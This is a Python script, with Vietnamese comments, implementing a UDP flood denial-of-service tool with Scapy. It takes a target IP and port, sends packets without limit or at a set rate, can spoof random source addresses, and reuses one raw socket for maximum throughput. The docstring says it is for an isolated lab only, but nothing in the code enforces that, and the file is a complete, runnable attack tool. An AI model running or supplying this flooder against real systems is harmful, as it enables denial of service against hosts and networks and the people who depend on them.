#!/usr/bin/env python3
"""UDP Flood (L3/4 volumetric) - chi dung trong lab co lap."""
import sys, random, argparse, time
from scapy.all import IP, UDP, Raw, RandShort, conf

def rand_ip():
    # gia mao source IP: UDP khong bat tay nen spoof duoc (giong syn_flood)
    return "10.%d.%d.%d" % (random.randint(0,255), random.randint(0,255), random.randint(1,254))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")                       # IP victim
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-c", "--count", type=int, default=0, help="so goi, 0 = vo han")
    ap.add_argument("--spoof", action="store_true", help="gia mao source IP")
    ap.add_argument("--pps", type=int, default=0,
                    help="gioi han toc do goi/giay (0 = toi da). Dung de kiem soat tai, "
                         "va voi --spoof thi pps cao -> nhieu nguon gia hon trong moi cua so")
    ap.add_argument("--size", type=int, default=32, help="so byte payload moi goi (mac dinh 32)")
    args = ap.parse_args()

    # Tai su dung MOT socket L3 thay vi goi send() moi lan -> nhanh hon nhieu (giong syn_flood).
    sock = conf.L3socket()
    payload = Raw(load=b"X" * max(args.size, 0))
    interval = 1.0 / args.pps if args.pps > 0 else 0.0
    next_t = time.perf_counter()

    sent = 0
    print("[*] UDP flood -> %s:%d (spoof=%s, pps=%s, size=%d)" % (
        args.target, args.port, args.spoof, args.pps or "max", args.size))
    try:
        while args.count == 0 or sent < args.count:
            src = rand_ip() if args.spoof else None
            pkt = IP(src=src, dst=args.target) / UDP(sport=RandShort(), dport=args.port) / payload
            sock.send(pkt)
            sent += 1
            if interval:                      # dieu tiet toc do (pacing)
                next_t += interval
                delay = next_t - time.perf_counter()
                if delay > 0:
                    time.sleep(delay)
            if sent % 500 == 0:
                print("[*] sent %d" % sent)
    except KeyboardInterrupt:
        pass
    finally:
        try: sock.close()
        except Exception: pass
    print("[*] done, tong goi: %d" % sent)

if __name__ == "__main__":
    main()
